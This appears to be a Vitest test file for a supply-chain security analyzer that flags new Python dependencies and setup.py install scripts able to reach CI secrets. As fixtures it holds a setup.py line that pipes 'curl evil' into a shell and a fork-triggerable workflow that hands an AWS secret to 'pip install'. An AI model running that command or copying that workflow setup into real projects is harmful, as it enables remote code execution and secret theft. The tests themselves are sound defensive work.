import { describe, expect, it } from 'vitest';
import { runEngine } from '../../engine/gate';
import { analyzePyDeps, parseRequirements } from './index';

describe('parseRequirements (0033)', () => {
  it('parses pinned and unpinned packages, skipping comments and options', () => {
    const reqs = parseRequirements(
      ['# deps', 'Flask==2.0.1', 'requests>=2.0', '-r base.txt', '', 'PyYAML'].join('\n'),
    );
    expect(reqs.get('flask')).toBe('2.0.1');
    expect(reqs.get('requests')).toBe(''); // unpinned (constraint, not ==)
    expect(reqs.get('pyyaml')).toBe('');
    expect(reqs.has('base.txt')).toBe(false); // the -r option is skipped
  });
});

describe('analyzePyDeps requirements.txt diff (0033)', () => {
  it('emits an install-capable python dep + new-dependency entry for an added package', () => {
    const r = analyzePyDeps({
      manifests: [],
      requirements: { head: 'flask==2.0.1\nevil-pkg==1.0.0', base: 'flask==2.0.1' },
    });
    const dep = r.nodes.find((n) => n.kind === 'dependency' && 'pkg' in n && n.pkg === 'evil-pkg');
    expect(dep && dep.kind === 'dependency' && dep.hasInstallScript).toBe(true);
    expect(dep && dep.kind === 'dependency' && dep.ecosystem).toBe('python');
    expect(r.nodes.some((n) => n.kind === 'entry' && n.entryKind === 'new-dependency')).toBe(true);
  });

  it('does not flag an unchanged requirements package', () => {
    const r = analyzePyDeps({
      manifests: [],
      requirements: { head: 'flask==2.0.1', base: 'flask==2.0.1' },
    });
    expect(r.nodes).toHaveLength(0);
  });
});

describe('analyzePyDeps (0028)', () => {
  it('emits a python dependency node with an install script for setup.py', () => {
    const r = analyzePyDeps({
      manifests: [{ path: 'setup.py', head: 'import os; os.system("curl evil|sh")', base: null }],
    });
    expect(r.nodes.find((n) => n.kind === 'dependency')).toMatchObject({
      kind: 'dependency',
      ecosystem: 'python',
      hasInstallScript: true,
    });
  });

  it('adds a new-dependency entry when setup.py is added (no base)', () => {
    const r = analyzePyDeps({ manifests: [{ path: 'setup.py', head: 'x', base: null }] });
    expect(r.nodes.find((n) => n.kind === 'entry')).toMatchObject({ entryKind: 'new-dependency' });
  });

  it('adds an entry when setup.py changed vs base', () => {
    const r = analyzePyDeps({ manifests: [{ path: 'setup.py', head: 'new', base: 'old' }] });
    expect(r.nodes.some((n) => n.kind === 'entry')).toBe(true);
  });

  it('no entry when setup.py is unchanged — dep node still present for the runs-in edge', () => {
    const r = analyzePyDeps({ manifests: [{ path: 'setup.py', head: 'same', base: 'same' }] });
    expect(r.nodes.some((n) => n.kind === 'entry')).toBe(false);
    expect(r.nodes.some((n) => n.kind === 'dependency')).toBe(true);
  });

  it('nothing when there is no setup.py at head', () => {
    const r = analyzePyDeps({ manifests: [{ path: 'setup.py', head: null, base: 'old' }] });
    expect(r.nodes).toHaveLength(0);
  });
});

describe('engine: Python install-time execution reaches a CI secret (0028)', () => {
  const WORKFLOW = [
    'on:',
    '  pull_request_target:',
    'jobs:',
    '  test:',
    '    steps:',
    '      - run: pip install .',
    '        env:',
    '          AWS: ${{ secrets.AWS_SECRET_ACCESS_KEY }}',
  ].join('\n');

  it('a changed setup.py in a fork-triggerable pip-install secret job is a fail', () => {
    const result = runEngine({
      pydeps: { manifests: [{ path: 'setup.py', head: 'malicious', base: null }] },
      ci: { workflows: [{ path: 'ci.yml', content: WORKFLOW }] },
    });
    expect(result.verdict).toBe('fail');
    const f = result.findings.find((x) => x.pathNodeIds.includes('dep:python:setup.py'));
    expect(f, 'a Python install-time → secret path').toBeDefined();
    expect(f!.tier).toBe('fail');
    expect(f!.labels).toContain('ASI04:2026');
  });

  it('an unchanged setup.py with no fork-triggerable secret job does not fail', () => {
    const PUSH = WORKFLOW.replace('  pull_request_target:', '  push:\n    branches: [main]');
    const result = runEngine({
      pydeps: { manifests: [{ path: 'setup.py', head: 'same', base: 'same' }] },
      ci: { workflows: [{ path: 'ci.yml', content: PUSH }] },
    });
    expect(result.verdict).toBe('pass');
  });
});
